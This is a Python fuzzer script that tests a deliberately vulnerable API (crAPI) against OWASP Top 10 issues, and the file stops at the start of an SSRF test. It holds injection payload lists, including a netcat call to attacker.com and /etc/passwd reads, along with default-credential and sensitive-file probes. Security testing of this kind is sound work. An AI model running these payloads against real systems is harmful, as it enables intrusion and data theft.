#!/usr/bin/env python3
"""
OWASP Top 10 API Fuzzer for crAPI
Tests endpoints against common security vulnerabilities
"""

import json
import requests
import time
import sys
from datetime import datetime
from typing import Dict, List, Tuple, Optional
from dataclasses import dataclass, asdict
from enum import Enum
import argparse
import threading
from http.server import HTTPServer, BaseHTTPRequestHandler
import webbrowser

# Color codes for terminal output
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    END = '\033[0m'
    GRAY = '\033[90m'

class Severity(Enum):
    CRITICAL = "CRITICAL"
    HIGH = "HIGH"
    MEDIUM = "MEDIUM"
    LOW = "LOW"
    INFO = "INFO"

@dataclass
class TestResult:
    endpoint: str
    method: str
    vulnerability: str
    payload: str
    status_code: int
    response_time: float
    response_body: str
    severity: Severity
    description: str
    vulnerable: bool = False

class APIFuzzer:
    def __init__(self, base_url: str = "http://localhost:8888", timeout: int = 10):
        self.base_url = base_url.rstrip('/')
        self.timeout = timeout
        self.session = requests.Session()
        self.results: List[TestResult] = []
        self.auth_token: Optional[str] = None
        
    def print_banner(self):
        """Print fuzzer banner"""
        banner = f"""
{Colors.BOLD}{Colors.CYAN}
╔══════════════════════════════════════════════════════════════╗
║          OWASP Top 10 API Fuzzer for crAPI                   ║
║          Testing Security Vulnerabilities                    ║
╚══════════════════════════════════════════════════════════════╝
{Colors.END}
Base URL: {self.base_url}
Started: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
"""
        print(banner)
    
    def authenticate(self) -> bool:
        """Create a test user and authenticate"""
        try:
            # Create test user
            signup_data = {
                "email": f"fuzzer_{int(time.time())}@example.com",
                "name": "Fuzzer Test User",
                "number": "1234567890",
                "password": "FuzzerTest123!"
            }
            
            signup_response = self.session.post(
                f"{self.base_url}/identity/api/auth/signup",
                json=signup_data,
                timeout=self.timeout
            )
            
            if signup_response.status_code in [200, 403]:  # 403 if user exists, try login
                # Try to login
                login_data = {
                    "email": signup_data["email"],
                    "password": signup_data["password"]
                }
                
                login_response = self.session.post(
                    f"{self.base_url}/identity/api/auth/login",
                    json=login_data,
                    timeout=self.timeout
                )
                
                if login_response.status_code == 200:
                    try:
                        token_data = login_response.json()
                        self.auth_token = token_data.get("token") or token_data.get("access_token")
                        if self.auth_token:
                            print(f"{Colors.GREEN}✓ Authentication successful{Colors.END}")
                            return True
                    except:
                        pass
            
            print(f"{Colors.YELLOW}⚠ Could not authenticate, continuing with unauthenticated tests{Colors.END}")
            return False
        except Exception as e:
            print(f"{Colors.YELLOW}⚠ Authentication failed: {e}{Colors.END}")
            return False
    
    def get_headers(self, include_auth: bool = True) -> Dict[str, str]:
        """Get request headers"""
        headers = {
            "Content-Type": "application/json",
            "User-Agent": "OWASP-Fuzzer/1.0"
        }
        if include_auth and self.auth_token:
            headers["Authorization"] = f"Bearer {self.auth_token}"
        return headers
    
    def test_endpoint(self, method: str, endpoint: str, payload: Dict, 
                     vulnerability: str, severity: Severity, description: str) -> TestResult:
        """Test a single endpoint with a payload"""
        url = f"{self.base_url}{endpoint}"
        start_time = time.time()
        
        try:
            if method.upper() == "GET":
                response = self.session.get(
                    url,
                    params=payload,
                    headers=self.get_headers(),
                    timeout=self.timeout
                )
            elif method.upper() == "POST":
                response = self.session.post(
                    url,
                    json=payload,
                    headers=self.get_headers(),
                    timeout=self.timeout
                )
            elif method.upper() == "PUT":
                response = self.session.put(
                    url,
                    json=payload,
                    headers=self.get_headers(),
                    timeout=self.timeout
                )
            elif method.upper() == "DELETE":
                response = self.session.delete(
                    url,
                    json=payload,
                    headers=self.get_headers(),
                    timeout=self.timeout
                )
            else:
                response = None
            
            response_time = time.time() - start_time
            
            if response:
                try:
                    response_body = response.text[:1000]  # Increased to catch more data
                except:
                    response_body = "Unable to read response"
                
                # Heuristic detection of vulnerabilities - pass payload for context
                vulnerable = self.detect_vulnerability(response, response_body, vulnerability, payload)
                
                # ALWAYS check for information disclosure, regardless of other vulnerabilities
                # This catches data exposure even in "safe" responses
                info_disclosure = False
                info_disclosure_details = []
                
                # Check for information disclosure in error responses
                if response.status_code in [400, 401, 403, 404, 500, 502, 503]:
                    if self.detect_information_disclosure(response_body):
                        info_disclosure = True
                        info_disclosure_details.append("Information disclosure in error response")
                
                # Check for excessive data exposure in successful responses (200 OK)
                if response.status_code == 200:
                    if self.detect_excessive_data_exposure(response_body, payload):
                        info_disclosure = True
                        info_disclosure_details.append("Excessive data exposure in successful response")
                    # Also check for information disclosure patterns in 200 responses
                    if self.detect_information_disclosure(response_body):
                        info_disclosure = True
                        info_disclosure_details.append("Sensitive information in response")
                
                # If information disclosure found, mark as vulnerable
                if info_disclosure:
                    vulnerable = True
                    if vulnerability != "Information Disclosure":
                        # Add information disclosure as additional vulnerability
                        description += f" | INFO DISCLOSURE: {', '.join(info_disclosure_details)}"
                
                result = TestResult(
                    endpoint=endpoint,
                    method=method,
                    vulnerability=vulnerability,
                    payload=str(payload)[:200],
                    status_code=response.status_code,
                    response_time=response_time,
                    response_body=response_body,
                    severity=severity,
                    description=description,
                    vulnerable=vulnerable
                )
            else:
                result = TestResult(
                    endpoint=endpoint,
                    method=method,
                    vulnerability=vulnerability,
                    payload=str(payload)[:200],
                    status_code=0,
                    response_time=0,
                    response_body="No response",
                    severity=severity,
                    description=description,
                    vulnerable=False
                )
        except requests.exceptions.Timeout:
            result = TestResult(
                endpoint=endpoint,
                method=method,
                vulnerability=vulnerability,
                payload=str(payload)[:200],
                status_code=0,
                response_time=self.timeout,
                response_body="Request timeout",
                severity=severity,
                description=description,
                vulnerable=False
            )
        except Exception as e:
            result = TestResult(
                endpoint=endpoint,
                method=method,
                vulnerability=vulnerability,
                payload=str(payload)[:200],
                status_code=0,
                response_time=0,
                response_body=f"Error: {str(e)}",
                severity=severity,
                description=description,
                vulnerable=False
            )
        
        self.results.append(result)
        
        # Post-process: Re-check result for information disclosure if it was marked as safe
        # This ensures we catch data exposure even if the primary vulnerability test passed
        if result and not result.vulnerable and result.status_code > 0:
            if self.detect_information_disclosure(result.response_body):
                result.vulnerable = True
                result.vulnerability = "Information Disclosure"
                result.description = f"{result.description} | INFO DISCLOSURE: Sensitive data exposed"
                result.severity = Severity.MEDIUM if result.severity == Severity.INFO else result.severity
            elif result.status_code == 200 and self.detect_excessive_data_exposure(result.response_body, payload):
                result.vulnerable = True
                result.vulnerability = "Excessive Data Exposure"
                result.description = f"{result.description} | EXCESSIVE DATA: More data exposed than necessary"
                result.severity = Severity.MEDIUM if result.severity == Severity.INFO else result.severity
        
        return result
    
    def detect_vulnerability(self, response: requests.Response, body: str, vuln_type: str, payload: Dict = None) -> bool:
        """Heuristic detection of vulnerabilities"""
        body_lower = body.lower()
        status = response.status_code
        payload_str = str(payload).lower() if payload else ""
        
        # SQL Injection indicators
        if "sql" in vuln_type.lower():
            sql_errors = [
                "sql syntax", "mysql", "postgresql", "oracle", "sqlite",
                "sqlstate", "sql error", "database error", "query failed",
                "syntax error", "pg_query", "sqlite3", "mysqli", "psycopg2"
            ]
            if any(err in body_lower for err in sql_errors):
                return True
            # Check for successful SQL injection - if we sent SQL payload and got unexpected data
            if payload and status == 200:
                payload_str_lower = payload_str.lower()
                sql_payloads = ["' or '1'='1", "' or 1=1", "union select", "'; drop", "or '1'='1"]
                if any(sql_payload in payload_str_lower for sql_payload in sql_payloads):
                    # If we sent SQL injection and got 200, check if we got more data than expected
                    if len(body) > 100:
                        # Check if response contains multiple records or unexpected data
                        try:
                            import json
                            resp_json = json.loads(body)
                            if isinstance(resp_json, list) and len(resp_json) > 1:
                                return True  # Got multiple records when we shouldn't
                            elif isinstance(resp_json, dict):
                                # Check for unexpected fields
                                if len(resp_json) > 5:  # More fields than expected
                                    return True
                        except:
                            # If response is very long, might be SQL injection
                            if len(body) > 500:
                                return True
        
        # NoSQL Injection indicators
        if "nosql" in vuln_type.lower():
            nosql_errors = [
                "mongodb", "bson", "mongo error", "invalid key",
                "unexpected token", "syntaxerror", "mongoexception"
            ]
            if any(err in body_lower for err in nosql_errors):
                return True
            # Check for successful NoSQL injection - if we sent operators and got unexpected success
            if payload and status == 200:
                # Check if payload contained NoSQL operators
                payload_str_lower = payload_str.lower()
                nosql_ops = ["$ne", "$gt", "$regex", "$where", "$or", "$exists"]
                if any(op in payload_str_lower for op in nosql_ops):
                    # If we used NoSQL operators and got 200, it might be vulnerable
                    # But only if it's an auth endpoint (login, coupon validation, etc.)
                    if any(endpoint in payload_str_lower for endpoint in ["login", "coupon", "auth"]):
                        # Check if we got a token or success when we shouldn't
                        if any(success_indicator in body_lower for success_indicator in ["token", "success", "valid", "true"]):
                            return True
        
        # Command Injection indicators
        if "command" in vuln_type.lower() or ("injection" in vuln_type.lower() and "sql" not in vuln_type.lower() and "nosql" not in vuln_type.lower()):
            cmd_errors = [
                "sh:", "bash:", "cmd.exe", "command not found",
                "permission denied", "cannot execute", "bin/sh",
                "cmd /c", "powershell", "/bin/bash"
            ]
            if any(err in body_lower for err in cmd_errors):
                return True
            # Command injection might succeed without errors
            if status == 200 and any(indicator in body_lower for indicator in ["uid=", "gid=", "root:", "www-data"]):
                return True
        
        # XSS indicators
        if "xss" in vuln_type.lower():
            if "<script>" in body or "javascript:" in body_lower or "onerror=" in body_lower:
                return True
        
        # Path Traversal indicators
        if "path" in vuln_type.lower() or "traversal" in vuln_type.lower():
            path_errors = [
                "no such file", "cannot find", "access denied",
                "file not found", "directory", "permission denied"
            ]
            if any(err in body_lower for err in path_errors):
                return True
            # Path traversal might succeed and return file contents
            if status == 200 and any(indicator in body_lower for indicator in ["root:", "/bin/", "/etc/", "passwd", "shadow"]):
                return True
        
        # SSRF indicators - improved detection
        if "ssrf" in vuln_type.lower():
            ssrf_indicators = [
                "connection refused", "connection timeout",
                "internal server", "connection error", "network error"
            ]
            if any(ind in body_lower for ind in ssrf_indicators):
                return True
            # Check if the URL we sent appears in the response (SSRF was processed)
            if payload:
                # Look for URLs in payload that might have been processed
                for key, value in payload.items():
                    if isinstance(value, str) and ("http://" in value or "https://" in value):
                        # Check if this URL appears in response (was processed)
                        if value.lower() in body_lower or value.replace("http://", "").replace("https://", "").lower() in body_lower:
                            return True
                        # Check for localhost/127.0.0.1 in response if we sent it
                        if ("localhost" in value.lower() or "127.0.0.1" in value) and ("localhost" in body_lower or "127.0.0.1" in body_lower):
                            return True
            # If status is 200 and we sent an internal URL, it's likely SSRF
            if status == 200 and payload_str:
                if any(ip in payload_str for ip in ["127.0.0.1", "localhost", "169.254.169.254", "0.0.0.0"]):
                    # Check if response is JSON and contains the URL we sent
                    try:
                        import json
                        resp_json = json.loads(body)
                        if isinstance(resp_json, dict):
                            # Check if any value in response contains our URL
                            resp_str = json.dumps(resp_json).lower()
                            if any(ip in resp_str for ip in ["127.0.0.1", "localhost"]):
                                return True
                    except:
                        pass
        
        # Authentication bypass - improved
        if "auth" in vuln_type.lower() or "bypass" in vuln_type.lower():
            # If we get 200 without proper auth, it's a bypass
            if status == 200 and "unauthorized" not in body_lower and "forbidden" not in body_lower:
                # Check if response contains user data
                if any(indicator in body_lower for indicator in ["email", "user", "id", "token", "dashboard"]):
                    return True
        
        # Broken Access Control / IDOR
        if "access" in vuln_type.lower() or "idor" in vuln_type.lower() or "bola" in vuln_type.lower():
            # For IDOR, we need to check if we accessed resources we shouldn't have
            # If we're testing without auth and get 200, that's a vulnerability
            if not self.auth_token and status == 200:
                # Check if response contains actual data (not just error messages)
                if len(body) > 50 and any(indicator in body_lower for indicator in ["id", "email", "user", "vehicle", "order", "video", "dashboard"]):
                    # Make sure it's not an error message
                    if not any(err in body_lower for err in ["error", "unauthorized", "forbidden", "access denied"]):
                        return True
            # If we're testing with invalid IDs and get data back, that's IDOR
            elif status == 200 and payload:
                # Check if we used invalid/other user's IDs
                invalid_ids = ["999999", "-1", "0", "999", "9999"]
                if any(str(id_val) in str(payload) for id_val in invalid_ids):
                    # If we got data back with invalid IDs, it's likely IDOR
                    if len(body) > 50:
                        try:
                            import json
                            resp_json = json.loads(body)
                            # If we got structured data back, it's likely a vulnerability
                            if isinstance(resp_json, (dict, list)) and len(str(resp_json)) > 50:
                                return True
                        except:
                            # If response is substantial and not an error, might be IDOR
                            if len(body) > 100 and not any(err in body_lower for err in ["not found", "error", "invalid"]):
                                return True
        
        # Mass Assignment
        if "mass" in vuln_type.lower() or "assignment" in vuln_type.lower():
            # Check if we sent extra fields and they were accepted/applied
            if payload and status == 200:
                # Check if we tried to assign privileged fields
                privileged_fields = ["role", "admin", "is_admin", "privilege", "privileges", "is_staff", "is_superuser"]
                sent_privileged = any(field in payload_str for field in privileged_fields)
                if sent_privileged:
                    # Check if response contains these fields (they were applied)
                    if any(field in body_lower for field in privileged_fields):
                        return True
                    # Also check if we got a success response when we shouldn't have been able to set these
                    try:
                        import json
                        resp_json = json.loads(body)
                        if isinstance(resp_json, dict):
                            # If response contains any of the privileged fields we sent, it's vulnerable
                            for field in privileged_fields:
                                if field in payload_str and field in str(resp_json).lower():
                                    return True
                    except:
                        pass
        
        # Information disclosure - improved (check for ALL sensitive data)
        if "information" in vuln_type.lower() or "disclosure" in vuln_type.lower():
            if self.detect_information_disclosure(body):
                return True
            # Also check for sensitive data in successful responses (200 OK)
            if status == 200:
                # Check for excessive data exposure
                if self.detect_excessive_data_exposure(body, payload):
                    return True
        
        # Security Misconfiguration
        if "misconfiguration" in vuln_type.lower() or "default" in vuln_type.lower():
            # If we can access with default credentials, it's vulnerable
            if status == 200:
                if any(indicator in body_lower for indicator in ["token", "success", "welcome", "dashboard"]):
                    return True
        
        # Unusual status codes that might indicate vulnerabilities
        if status in [500, 502, 503] and len(body) > 100:
            # Server errors might reveal information
            if self.detect_information_disclosure(body):
                return True
        
        # Rate limiting - if we can make many requests without 429, it's vulnerable
        if "rate" in vuln_type.lower() or "limiting" in vuln_type.lower():
            # This is handled separately in test_rate_limiting
            pass
        
        return False
    
    def detect_excessive_data_exposure(self, body: str, payload: Dict = None) -> bool:
        """Detect excessive data exposure in successful responses"""
        body_lower = body.lower()
        
        # Check for sensitive fields that shouldn't be exposed
        sensitive_fields = [
            "password", "passwd", "secret", "secretkey",
            "api_key", "apikey", "access_token", "refresh_token",
            "ssn", "social_security", "credit_card", "cvv",
            "pin", "passcode", "private_key", "privatekey"
        ]
        
        # Check if response contains sensitive field names with values
        try:
            import json
            import re
            json_data = json.loads(body)
            
            if isinstance(json_data, dict):
                # Check for sensitive fields
                for field in sensitive_fields:
                    for key, value in json_data.items():
                        if field in key.lower():
                            # If it has a non-empty value, it's exposed
                            if value and str(value) not in ["null", "none", "", "undefined"]:
                                return True
                
                # Check for excessive user data
                user_data_fields = ["email", "phone", "address", "dob", "date_of_birth"]
                exposed_user_fields = [f for f in user_data_fields if any(f in k.lower() for k in json_data.keys())]
                if len(exposed_user_fields) >= 3:  # Multiple PII fields exposed
                    return True
                
                # Check for internal IDs and UUIDs
                uuid_pattern = r'[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}'
                uuids = re.findall(uuid_pattern, str(json_data), re.IGNORECASE)
                if len(uuids) > 3:  # Multiple UUIDs might indicate data leak
                    return True
                    
            elif isinstance(json_data, list):
                # If we got a list when we shouldn't have, might be excessive data
                if len(json_data) > 10:  # Large list might be excessive
                    # Check if items contain sensitive data
                    for item in json_data[:5]:  # Check first 5 items
                        if isinstance(item, dict):
                            for field in sensitive_fields:
                                if any(field in str(k).lower() for k in item.keys()):
                                    return True
        except:
            pass
        
        # Check for email addresses in response (PII)
        email_pattern = r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b'
        emails = re.findall(email_pattern, body)
        if len(emails) > 3:  # Multiple emails = potential data leak
            return True
        
        # Check for phone numbers (PII)
        phone_pattern = r'\b\+?\d{10,15}\b|\b\d{3}-\d{3}-\d{4}\b'
        phones = re.findall(phone_pattern, body)
        if len(phones) > 3:
            return True
        
        # Check for credit card patterns
        cc_pattern = r'\b(?:\d{4}[-\s]?){3}\d{4}\b'
        if re.search(cc_pattern, body):
            return True
        
        return False
    
    def print_result(self, result: TestResult):
        """Print a single test result"""
        if result.vulnerable:
            color = Colors.RED
            icon = "✗"
        elif result.status_code == 0:
            color = Colors.GRAY
            icon = "○"
        else:
            color = Colors.GREEN
            icon = "✓"
        
        severity_color = {
            Severity.CRITICAL: Colors.RED,
            Severity.HIGH: Colors.YELLOW,
            Severity.MEDIUM: Colors.CYAN,
            Severity.LOW: Colors.BLUE,
            Severity.INFO: Colors.GRAY
        }.get(result.severity, Colors.WHITE)
        
        print(f"{color}{icon}{Colors.END} [{severity_color}{result.severity.value}{Colors.END}] "
              f"{result.method:6} {result.endpoint:50} "
              f"Status: {result.status_code:3} "
              f"Time: {result.response_time:.2f}s")
        
        if result.vulnerable:
            print(f"      {Colors.RED}⚠ POTENTIALLY VULNERABLE{Colors.END}: {result.description}")
            print(f"      Payload: {Colors.YELLOW}{result.payload[:100]}{Colors.END}")
    
    # ==================== OWASP Top 10 Test Methods ====================
    
    def test_sql_injection(self):
        """A03:2021 – Injection - SQL Injection"""
        print(f"\n{Colors.BOLD}{Colors.CYAN}[*] Testing A03:2021 – Injection (SQL Injection){Colors.END}")
        
        sql_payloads = [
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' /*",
            "admin'--",
            "admin'/*",
            "' UNION SELECT NULL--",
            "1' AND '1'='1",
            "1' AND '1'='2",
            "'; DROP TABLE users--",
            "' OR 1=1#"
        ]
        
        endpoints = [
            ("POST", "/identity/api/auth/login", {"email": None, "password": None}),
            ("POST", "/identity/api/auth/signup", {"email": None, "name": None, "number": None, "password": None}),
            ("GET", "/identity/api/v2/user/dashboard", {}),
            ("GET", "/workshop/api/shop/products", {}),
        ]
        
        for method, endpoint, base_payload in endpoints:
            for payload in sql_payloads:
                test_payload = base_payload.copy()
                for key in test_payload.keys():
                    if test_payload[key] is None:
                        test_payload[key] = payload
                    else:
                        test_payload[key] = str(test_payload[key]) + payload
                
                result = self.test_endpoint(
                    method, endpoint, test_payload,
                    "SQL Injection", Severity.HIGH,
                    f"SQL injection attempt with payload: {payload}"
                )
                self.print_result(result)
                time.sleep(0.1)  # Rate limiting
    
    def test_nosql_injection(self):
        """A03:2021 – Injection - NoSQL Injection"""
        print(f"\n{Colors.BOLD}{Colors.CYAN}[*] Testing A03:2021 – Injection (NoSQL Injection){Colors.END}")
        
        nosql_payloads = [
            {"$ne": None},
            {"$gt": ""},
            {"$regex": ".*"},
            {"$where": "this.password == this.email"},
            {"$or": [{"email": "admin"}, {"email": "test"}]},
            {"email": {"$ne": "test"}},
            {"$exists": True},
            {"email": {"$ne": ""}},
            {"password": {"$ne": ""}},
            {"$or": [{"email": {"$ne": ""}}, {"password": {"$ne": ""}}]},
        ]
        
        endpoints = [
            ("POST", "/identity/api/auth/login", {"email": "test@example.com", "password": "test"}),
            ("POST", "/community/api/v2/coupon/validate-coupon", {"coupon_code": None}),
            ("GET", "/community/api/v2/community/posts/recent", {}),
            ("GET", "/community/api/v2/community/posts/1", {}),
        ]
        
        for method, endpoint, base_payload in endpoints:
            for payload in nosql_payloads:
                if base_payload is None:
                    test_payload = payload
                else:
                    test_payload = base_payload.copy()
                    # Merge NoSQL payload into the base payload
                    for key, value in payload.items():
                        if key.startswith("$"):
                            # This is a MongoDB operator, need to structure it properly
                            test_payload[key] = value
                        else:
                            test_payload[key] = value
                
                result = self.test_endpoint(
                    method, endpoint, test_payload,
                    "NoSQL Injection", Severity.HIGH,
                    f"NoSQL injection attempt"
                )
                self.print_result(result)
                time.sleep(0.1)
    
    def test_command_injection(self):
        """A03:2021 – Injection - Command Injection"""
        print(f"\n{Colors.BOLD}{Colors.CYAN}[*] Testing A03:2021 – Injection (Command Injection){Colors.END}")
        
        cmd_payloads = [
            "; ls",
            "| whoami",
            "&& cat /etc/passwd",
            "`id`",
            "$(whoami)",
            "; cat /etc/passwd",
            "| nc attacker.com 4444",
            "; ping -c 4 127.0.0.1",
        ]
        
        endpoints = [
            ("POST", "/identity/api/v2/user/videos/convert_video", {"video_id": None}),
            ("GET", "/identity/api/v2/user/videos/convert_video", {"video_id": None}),
        ]
        
        for method, endpoint, base_payload in endpoints:
            for payload in cmd_payloads:
                test_payload = base_payload.copy()
                for key in test_payload.keys():
                    if test_payload[key] is None:
                        test_payload[key] = f"1{payload}"
                    else:
                        test_payload[key] = str(test_payload[key]) + payload
                
                result = self.test_endpoint(
                    method, endpoint, test_payload,
                    "Command Injection", Severity.CRITICAL,
                    f"Command injection attempt: {payload}"
                )
                self.print_result(result)
                time.sleep(0.1)
    
    def test_broken_authentication(self):
        """A07:2021 – Identification and Authentication Failures"""
        print(f"\n{Colors.BOLD}{Colors.CYAN}[*] Testing A07:2021 – Identification and Authentication Failures{Colors.END}")
        
        # Test weak passwords
        weak_passwords = ["123456", "password", "admin", "test", "12345", ""]
        for pwd in weak_passwords:
            result = self.test_endpoint(
                "POST", "/identity/api/auth/signup",
                {"email": "test@example.com", "name": "Test", "number": "123", "password": pwd},
                "Weak Password Policy", Severity.MEDIUM,
                f"Testing weak password: {pwd}"
            )
            self.print_result(result)
        
        # Test authentication bypass
        bypass_attempts = [
            {"email": "admin' OR '1'='1", "password": "anything"},
            {"email": "admin", "password": "' OR '1'='1"},
            {"email": "", "password": ""},
            {"email": None, "password": None},
        ]
        
        for attempt in bypass_attempts:
            result = self.test_endpoint(
                "POST", "/identity/api/auth/login", attempt,
                "Authentication Bypass", Severity.CRITICAL,
                "Authentication bypass attempt"
            )
            self.print_result(result)
            time.sleep(0.1)
    
    def test_broken_access_control(self):
        """A01:2021 – Broken Access Control"""
        print(f"\n{Colors.BOLD}{Colors.CYAN}[*] Testing A01:2021 – Broken Access Control{Colors.END}")
        
        # Test IDOR (Insecure Direct Object Reference) - try accessing other users' resources
        endpoints = [
            ("GET", "/identity/api/v2/user/videos/1", {}),
            ("GET", "/identity/api/v2/user/videos/999999", {}),
            ("GET", "/identity/api/v2/user/videos/-1", {}),
            ("GET", "/identity/api/v2/user/videos/0", {}),
            ("GET", "/identity/api/v2/user/videos/2", {}),
            ("GET", "/identity/api/v2/user/videos/3", {}),
            ("PUT", "/identity/api/v2/user/videos/1", {"title": "hacked"}),
            ("DELETE", "/identity/api/v2/admin/videos/1", {}),
            ("GET", "/workshop/api/shop/orders/1", {}),
            ("GET", "/workshop/api/shop/orders/999999", {}),
            ("GET", "/workshop/api/shop/orders/2", {}),
            ("GET", "/workshop/api/mechanic/mechanic_report", {}),
            ("GET", "/workshop/api/mechanic/receive_report", {}),
            ("GET", "/identity/api/v2/vehicle/vehicles", {}),
            ("GET", "/identity/api/v2/vehicle/1/location", {}),
            ("GET", "/identity/api/v2/vehicle/2/location", {}),
        ]
        
        for method, endpoint, payload in endpoints:
            result = self.test_endpoint(
                method, endpoint, payload,
                "IDOR / Broken Access Control", Severity.HIGH,
                "Testing for insecure direct object reference"
            )
            self.print_result(result)
            time.sleep(0.1)
        
        # Test without authentication - more endpoints
        if self.auth_token:
            old_token = self.auth_token
            self.auth_token = None
            
            protected_endpoints = [
                ("GET", "/identity/api/v2/user/dashboard", {}),
                ("GET", "/workshop/api/shop/orders/all", {"limit": 10, "offset": 0}),
                ("GET", "/identity/api/v2/user/videos", {}),
                ("GET", "/identity/api/v2/vehicle/vehicles", {}),
                ("POST", "/workshop/api/shop/orders", {"product_id": 1, "quantity": 1}),
                ("GET", "/workshop/api/management/users/all", {}),
            ]
            
            for method, endpoint, payload in protected_endpoints:
                result = self.test_endpoint(
                    method, endpoint, payload,
                    "Missing Authentication", Severity.HIGH,
                    "Testing protected endpoint without authentication"
                )
                self.print_result(result)
                time.sleep(0.1)
            
            self.auth_token = old_token
    
    def test_security_misconfiguration(self):
        """A05:2021 – Security Misconfiguration"""
        print(f"\n{Colors.BOLD}{Colors.CYAN}[*] Testing A05:2021 – Security Misconfiguration{Colors.END}")
        
        # Test for exposed sensitive files
        sensitive_paths = [
            "/.env",
            "/.git/config",
            "/config.json",
            "/application.properties",
            "/web.xml",
            "/.DS_Store",
            "/robots.txt",
            "/sitemap.xml",
            "/.well-known/security.txt",
        ]
        
        for path in sensitive_paths:
            result = self.test_endpoint(
                "GET", path, {},
                "Security Misconfiguration", Severity.MEDIUM,
                f"Testing for exposed file: {path}"
            )
            self.print_result(result)
            time.sleep(0.1)
        
        # Test default credentials
        default_creds = [
            {"email": "admin@example.com", "password": "admin"},
            {"email": "admin", "password": "admin"},
            {"email": "root@example.com", "password": "root"},
        ]
        
        for creds in default_creds:
            result = self.test_endpoint(
                "POST", "/identity/api/auth/login", creds,
                "Default Credentials", Severity.MEDIUM,
                "Testing default credentials"
            )
            self.print_result(result)
            time.sleep(0.1)
    
    def test_low_severity_vulnerabilities(self):
        """Test for low severity vulnerabilities that should still be flagged"""
        print(f"\n{Colors.BOLD}{Colors.CYAN}[*] Testing Low Severity Vulnerabilities{Colors.END}")
        
        # Test for missing security headers
        security_header_endpoints = [
            ("GET", "/identity/api/v2/user/dashboard", {}),
            ("GET", "/workshop/api/shop/products", {}),
            ("GET", "/community/api/v2/community/posts/recent", {}),
        ]
        
        for method, endpoint, payload in security_header_endpoints:
            try:
                response = self.session.request(
                    method,
                    f"{self.base_url}{endpoint}",
                    json=payload if method != "GET" else None,
                    params=payload if method == "GET" else None,
                    headers=self.get_headers(),
                    timeout=self.timeout
                )
                
                missing_headers = []
                security_headers = {
                    "X-Content-Type-Options": "nosniff",
                    "X-Frame-Options": ["DENY", "SAMEORIGIN"],
                    "X-XSS-Protection": "1; mode=block",
                    "Strict-Transport-Security": "max-age",
                    "Content-Security-Policy": None,  # Just check if exists
                    "Referrer-Policy": None,
                }
                
                for header, expected_value in security_headers.items():
                    if header not in response.headers:
                        missing_headers.append(header)
                    elif expected_value and isinstance(expected_value, list):
                        if response.headers.get(header) not in expected_value:
                            missing_headers.append(f"{header} (incorrect value)")
                    elif expected_value and expected_value not in response.headers.get(header, ""):
                        missing_headers.append(f"{header} (incorrect value)")
                
                if missing_headers:
                    result = TestResult(
                        endpoint=endpoint,
                        method=method,
                        vulnerability="Missing Security Headers",
                        payload=str(payload)[:200],
                        status_code=response.status_code,
                        response_time=0,
                        response_body=f"Missing headers: {', '.join(missing_headers)}",
                        severity=Severity.LOW,
                        description=f"Missing security headers: {', '.join(missing_headers)}",
                        vulnerable=True  # Flag as vulnerable even though it's low severity
                    )
                    self.results.append(result)
                    self.print_result(result)
                time.sleep(0.05)
            except:
                pass
        
        # Test for version disclosure in headers
        for method, endpoint, payload in security_header_endpoints[:2]:
            try:
                response = self.session.request(
                    method,
                    f"{self.base_url}{endpoint}",
                    json=payload if method != "GET" else None,
                    params=payload if method == "GET" else None,
                    headers=self.get_headers(),
                    timeout=self.timeout
                )
                
                version_headers = ["Server", "X-Powered-By", "X-AspNet-Version", "X-Runtime"]
                exposed_versions = []
                
                for header in version_headers:
                    if header in response.headers:
                        exposed_versions.append(f"{header}: {response.headers[header]}")
                
                if exposed_versions:
                    result = TestResult(
                        endpoint=endpoint,
                        method=method,
                        vulnerability="Version Disclosure",
                        payload=str(payload)[:200],
                        status_code=response.status_code,
                        response_time=0,
                        response_body=f"Exposed versions: {', '.join(exposed_versions)}",
                        severity=Severity.LOW,
                        description=f"Server version information exposed in headers: {', '.join(exposed_versions)}",
                        vulnerable=True
                    )
                    self.results.append(result)
                    self.print_result(result)
                time.sleep(0.05)
            except:
                pass
        
        # Test for CORS misconfiguration
        cors_endpoints = [
            ("GET", "/identity/api/v2/user/dashboard", {}),
            ("GET", "/workshop/api/shop/products", {}),
        ]
        
        for method, endpoint, payload in cors_endpoints:
            try:
                # Test with Origin header
                headers = self.get_headers()
                headers["Origin"] = "https://evil.com"
                
                response = self.session.request(
                    method,
                    f"{self.base_url}{endpoint}",
                    json=payload if method != "GET" else None,
                    params=payload if method == "GET" else None,
                    headers=headers,
                    timeout=self.timeout
                )
                
                cors_header = response.headers.get("Access-Control-Allow-Origin", "")
                cors_creds = response.headers.get("Access-Control-Allow-Credentials", "")
                
                if cors_header == "*" or (cors_header == "https://evil.com" and cors_creds.lower() == "true"):
                    result = TestResult(
                        endpoint=endpoint,
                        method=method,
                        vulnerability="CORS Misconfiguration",
                        payload=str(payload)[:200],
                        status_code=response.status_code,
                        response_time=0,
                        response_body=f"CORS: {cors_header}, Credentials: {cors_creds}",
                        severity=Severity.LOW,
                        description=f"Insecure CORS configuration: Allow-Origin={cors_header}, Allow-Credentials={cors_creds}",
                        vulnerable=True
                    )
                    self.results.append(result)
                    self.print_result(result)
                time.sleep(0.05)
            except:
                pass
        
        # Test for HTTP methods disclosure (OPTIONS)
        for endpoint in ["/identity/api/v2/user/dashboard", "/workshop/api/shop/products"]:
            try:
                response = self.session.options(
                    f"{self.base_url}{endpoint}",
                    headers=self.get_headers(),
                    timeout=self.timeout
                )
                
                allowed_methods = response.headers.get("Allow", "") or response.headers.get("Access-Control-Allow-Methods", "")
                if allowed_methods and "DELETE" in allowed_methods or "PUT" in allowed_methods:
                    result = TestResult(
                        endpoint=endpoint,
                        method="OPTIONS",
                        vulnerability="HTTP Methods Disclosure",
                        payload="",
                        status_code=response.status_code,
                        response_time=0,
                        response_body=f"Allowed methods: {allowed_methods}",
                        severity=Severity.LOW,
                        description=f"HTTP methods exposed: {allowed_methods}",
                        vulnerable=True
                    )
                    self.results.append(result)
                    self.print_result(result)
                time.sleep(0.05)
            except:
                pass
    
    def test_ssrf(self):
        """A10:2021 – Server-Side Request Forgery (SSRF)"""
